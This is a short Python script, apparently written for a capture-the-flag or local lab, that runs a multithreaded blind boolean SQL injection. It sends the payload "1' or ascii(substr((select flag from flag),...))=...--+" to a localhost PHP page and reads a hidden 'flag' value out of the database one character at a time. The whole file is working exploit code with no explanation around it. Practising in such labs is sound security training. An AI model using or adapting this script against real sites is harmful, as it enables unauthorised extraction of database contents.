#python3
#by stao
import requests
import threading
words=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`']
url='http://127.0.0.1/1.php?name='
result="________________________________________________________________________________________________"
#replace function
def replace_char(string,char,index):
	string = list(string)
	string[index] = char
	return ''.join(string)
#to get result
def brute_result(n,m):
	global result
	for i in range(n,m):
		for j in words:
			payload="1' or ascii(substr((select flag from flag),"+str(i)+",1))="+str(ord(j))+"--+"
			#print(payload)
			url1=url+payload
			r=requests.get(url=url1)
			if "stao" in r.text:
				print(j)
				result=replace_char(result,j,i-1)
				print(result)

if __name__ == "__main__":
	length=60 #the length of result
	number=15 #the number of threads
	num=int(length/number) if(length % number ==0) else int(length/number)+1  #each threads's number
	#print(num)
	for i in range(0,number):
		print("thread_"+str(i+1)+"start.....")
		threading.Thread(target=brute_result, args=(i*num, (i+1)*num, )).start() #create and start thread
	

	
	
